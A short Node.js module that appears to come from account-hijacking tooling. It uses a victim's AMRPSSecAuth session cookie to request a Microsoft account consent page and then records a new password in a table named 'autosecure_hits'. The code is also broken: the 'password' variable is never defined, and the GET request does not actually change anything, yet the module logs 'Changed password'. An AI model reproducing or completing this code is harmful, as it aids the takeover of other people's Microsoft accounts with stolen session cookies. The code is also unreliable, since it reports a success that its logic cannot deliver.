const axios = require("axios");
const { queryParams } = require("../../../db/db");
module.exports = async (amrp, id) => {
 let data = await axios({
  method: "GET",
  url: "https://account.live.com/consent/Manage?guat=1",
  headers: {
   Cookie: `AMRPSSecAuth=${amrp};`,
  }
 });
 if (data?.data?.error) {
  console.log(`Failed to change password ${data.data.error}`)
 } else {
  if (id) {
   await queryParams(`UPDATE autosecure_hits SET password=? WHERE id=?`, [password, id])
  }
  console.log(`Changed password to ${password}`)
 }
}